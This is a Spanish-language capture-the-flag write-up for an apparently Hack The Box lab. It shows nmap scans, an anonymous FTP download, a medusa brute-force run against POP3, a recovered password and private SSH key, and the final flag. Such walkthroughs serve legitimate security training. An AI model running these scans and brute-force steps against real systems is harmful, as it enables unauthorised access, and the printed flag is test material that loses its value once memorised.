# Práctica Final: Medio 🐧

Como primer punto tenemos que **enumerar** los puertos disponibles en la máquina objetivo

```bash
nmap -p- -sS -Pn -n <IP> -oN ports
```

**Output**

![Ports.PNG](./assets/Medio/01-Nmap.PNG)

Vemos un servicio `unknown` así que usaremos nmap para descubrir a fondo cada servicio.

```bash
nmap -sCV -p22,53,110,995,2121,30021 [IP] -oN versions
```

**Output**

![Ports.PNG](./assets/Medio/02-Versions.PNG)


---

1. Nos logueamos en el serivicio `FTP` en el puerto 30021 como un usuario `anonymous`

   * `ftp [IP] -p 30021`

* Vemos al usuario `simon` y tiene un archivo `mynotes.txt`

![Ports.PNG](./assets/Medio/03-FTP.PNG)

* Nos descargamos el archivos usando **`get mynotes.txt`**

---

2. El archivos `mynotes.txt` contiene posibles contraseñas para el usuario **simon**, usaremos `medusa` para realizar **fuerza bruta** y verificar si la contraseña existen en el archivo `mynotes.txt`

* `medusa -u simon -P mynotes.txt -h [IP] -M pop3 -s`

**Output**
```
ACCOUNT FOUND: [pop3] Host: [IP] User: simon Password: 8Ns8j1b!23hs4921smHzwn [SUCCESS]
```

---

3. Ya poseemos credenciales válidas para el **servicio POP3** `simon:8Ns8j1b!23hs4921smHzwn`

* Accedemos al servicio y leemos el único correo

```
From: Admin <root@inlanefreight.htb>

Hi,
Here is your new key Simon. Enjoy and have a nice day..

 -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn
 NhAAAAAwEAAQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S4
 4W1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKm 
 w5xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAIITrtUA067VAMAAAAH c3NoLXJzYQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S44W 1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKmw5 
 xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAADAQABAAAAgQe3Qpknxi 6E89J55pCQoyK65hQ0WjTrqCUvt9oCUFggw85Xb+AU16tQz5C8sC55vH8NK9HEVk6/8lSR
 Lhy82tqGBfgGfvrx5pwPH9a5TFhxnEX/GHIvXhR0dBlbhUkQrTqOIc1XUdR+KjR1j8E0yi
 ZA4qKw1pK6BQLkHaCd3csBoQAAAEECeVZIC1Pq6T8/PnIHj0LpRcR8dEN0681+OfWtcJbJ
 hAWVrZ1wrgEg4i75wTgud5zOTV07FkcVXVBXSaWSPbmR7AAAAEED81FX7PttXnG6nSCqjz
 B85dsxntGw7C232hwgWVPM7DxCJQm21pxAwSLxp9CU9wnTwrYkVpEyLYYHkMknBMK0/QAA
 AEEDgPIA7TI4F8bPjOwNlLNulbQcT5amDp51fRWapCq45M7ptN4pTGrB97IBKPTi5qdodg
 O9Tm1rkjQ60Ty8OIjyJQAAABBzaW1vbkBsaW4tbWVkaXVtAQ== 
 -----END OPENSSH PRIVATE KEY-----
```

---

4. Tenemos un llave id_rsa **privada**, pero si nos logueamos con las credenciales `simon:8Ns8j1b!23hs4921smHzwn` en el servicio `SSH` nos dejará

* `ssh simon@[IP]`

---

5. Mostramos la **flag** 🏴

```
simon@lin-medium:~$ cat flag.txt 
HTB{1qay2wsx3EDC4rfv_M3D1UM}
```